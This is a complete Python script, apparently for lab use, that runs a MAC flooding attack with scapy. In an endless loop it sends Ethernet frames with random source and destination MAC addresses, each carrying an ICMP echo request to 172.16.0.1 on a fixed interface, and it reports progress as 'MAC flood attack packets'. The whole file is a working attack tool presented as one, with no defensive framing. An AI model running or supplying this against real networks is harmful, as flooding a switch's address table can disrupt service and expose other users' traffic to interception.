import time
import random

from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, ICMP
from scapy.all import sendp

HEX_DIGITS = "0123456789abcdef"
FORGERY_IP = "172.16.0.1"
IFACE = "enp5s0"


def gen_random_mac() -> str:
    result = ""
    for i in range(6):
        for j in range(2):
            result += random.choice(list(HEX_DIGITS))
        result += ":"
    return result[:-1]


def send_icmp_packet(forgery_ip: str = FORGERY_IP) -> None:
    src_mac = gen_random_mac()
    dst_mac = gen_random_mac()
    ether_packet = Ether(src=src_mac, dst=dst_mac)
    ether_packet.src = src_mac
    ether_packet.dst = dst_mac
    ether_packet.type = 0x0800  # IPv4
    icmp_packet = IP(dst=forgery_ip) / ICMP(type=8)
    frame = ether_packet / icmp_packet
    print("Packet to send:")
    frame.show()
    sendp(frame, iface=IFACE, verbose=False)


def attack() -> None:
    send_icmp_packet()


def main() -> None:
    t = 0
    print("Starting MAC flood attack...")
    try:
        while True:
            attack()
            time.sleep(0.01)
            t += 1
            if t % 50 == 0:
                print(f"Sent {t} MAC flood attack packets")
    except KeyboardInterrupt:
        print("Stopping MAC flood attack...")


if __name__ == "__main__":
    main()
